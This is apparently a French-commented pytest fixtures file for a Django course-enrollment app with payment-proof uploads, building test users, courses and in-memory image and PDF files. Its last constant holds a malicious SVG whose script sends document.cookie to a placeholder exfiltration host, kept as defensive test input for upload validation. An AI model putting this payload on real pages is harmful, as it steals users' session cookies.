"""Fixtures de l'inscription payante.

Les fichiers de test sont **fabriqués**, jamais lus depuis le dépôt : un binaire commité
n'est ni relisible en revue ni modifiable, et on veut pouvoir dire exactement ce que
contient chaque octet qu'on envoie.
"""

from __future__ import annotations

import io
from collections.abc import Iterator
from pathlib import Path
from typing import cast

import pytest
from django.core.cache import cache
from PIL import Image
from pytest_django.fixtures import SettingsWrapper
from rest_framework.test import APIClient

from apps.accounts.models import User
from apps.catalog.models import Chapter, Course, Lesson, Module
from apps.enrollment.models import Enrollment


@pytest.fixture(autouse=True)
def _cache_vide() -> Iterator[None]:
    cache.clear()
    yield
    cache.clear()


@pytest.fixture(autouse=True)
def stockage_temporaire(tmp_path: Path, settings: SettingsWrapper) -> Path:
    """Aucun test n'écrit dans le vrai répertoire de preuves.

    La clé de chiffrement est fixée ici : elle doit rester stable pendant un test pour
    qu'un écrire/relire fonctionne, et différente de celle du déploiement.
    """
    racine = tmp_path / "preuves"
    settings.PAYMENT_PROOF_STORAGE_DIR = str(racine)
    settings.PAYMENT_PROOF_ENCRYPTION_KEY = "cle-de-test-suffisamment-longue-pour-passer-le-garde"
    return racine


@pytest.fixture
def api_client() -> APIClient:
    return APIClient()


@pytest.fixture
def cours(db: None) -> Course:
    return Course.objects.create(
        slug="flutter-firebase-debutants",
        title="Flutter + Firebase pour débutants absolus",
        description="Une vraie application mobile, de zéro.",
        is_published=True,
    )


@pytest.fixture
def module_0(cours: Course) -> Module:
    return Module.objects.create(course=cours, order=0, title="Mise en route", summary="")


@pytest.fixture
def chapitre_gratuit(module_0: Module) -> Chapter:
    chapitre = Chapter.objects.create(
        module=module_0, slug="installer-flutter", order=1, title="Installer Flutter", is_free=True
    )
    Lesson.objects.create(chapter=chapitre, duration_s=480, transcript="Contenu gratuit.")
    return chapitre


@pytest.fixture
def chapitre_payant(module_0: Module) -> Chapter:
    chapitre = Chapter.objects.create(
        module=module_0,
        slug="ton-premier-widget",
        order=2,
        title="Ton premier widget",
        is_free=False,
    )
    Lesson.objects.create(
        chapter=chapitre, duration_s=600, transcript="Contenu réservé aux inscrits actifs."
    )
    return chapitre


@pytest.fixture
def etudiante(db: None) -> User:
    return cast(
        User,
        User.objects.create_user(
            email="etudiante@example.com", phone="0550112233", password="un-mot-de-passe-solide-123"
        ),
    )


@pytest.fixture
def etudiant_b(db: None) -> User:
    return cast(
        User,
        User.objects.create_user(
            email="karim@example.com", phone="0660112233", password="un-autre-mot-de-passe-456"
        ),
    )


@pytest.fixture
def administratrice(db: None) -> User:
    user = cast(
        User,
        User.objects.create_user(
            email="anis@example.com", phone="0770112233", password="mot-de-passe-admin-789"
        ),
    )
    # `is_staff` posé en base, jamais depuis une requête (§4.3).
    user.is_staff = True
    user.save(update_fields=["is_staff"])
    return user


@pytest.fixture
def inscription(etudiante: User, cours: Course) -> Enrollment:
    return Enrollment.objects.create(user=etudiante, course=cours, status=Enrollment.Status.PENDING)


def connecter(client: APIClient, user: User) -> APIClient:
    """Pose le cookie d'accès attendu par `CookieAccessTokenAuthentication`."""
    from apps.accounts.services import connecter as ouvrir_session
    from apps.accounts.tokens import parse_refresh_cookie_value

    mots_de_passe = {
        "etudiante@example.com": "un-mot-de-passe-solide-123",
        "karim@example.com": "un-autre-mot-de-passe-456",
        "anis@example.com": "mot-de-passe-admin-789",
    }
    emise = ouvrir_session(
        email=user.email,
        password=mots_de_passe[user.email],
        device_fingerprint="tests",
        ip_prefix="127.0.0",
    )
    assert parse_refresh_cookie_value(emise.refresh_token) is not None
    client.cookies["access_token"] = emise.access_token
    return client


# Chaque rôle a **son** client. Partager l'instance d'`api_client` faisait que le
# dernier connecté écrasait le cookie du précédent : un test qui demande à la fois
# l'admin et l'étudiante jouait alors les deux appels sous la même identité, et
# passait au vert pour de mauvaises raisons.
@pytest.fixture
def client_etudiante(etudiante: User) -> APIClient:
    return connecter(APIClient(), etudiante)


@pytest.fixture
def client_admin(administratrice: User) -> APIClient:
    return connecter(APIClient(), administratrice)


# --- Fabrication de fichiers -----------------------------------------------


def image_octets(
    format_pillow: str = "JPEG",
    taille: tuple[int, int] = (400, 300),
    exif: bytes | None = None,
) -> bytes:
    sortie = io.BytesIO()
    image = Image.new("RGB", taille, color=(200, 180, 120))
    if exif is not None:
        image.save(sortie, format=format_pillow, exif=exif)
    else:
        image.save(sortie, format=format_pillow)
    return sortie.getvalue()


def png_octets(taille: tuple[int, int] = (400, 300)) -> bytes:
    return image_octets("PNG", taille)


def pdf_octets(corps: bytes = b"") -> bytes:
    """PDF minimal valide. `corps` permet d'y glisser un marqueur actif dans les tests."""
    return b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n" + corps + b"\ntrailer\n%%EOF\n"


SVG_MALVEILLANT = (
    b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg">'
    b'<script>fetch("https://exfiltration.example/"+document.cookie)</script></svg>'
)
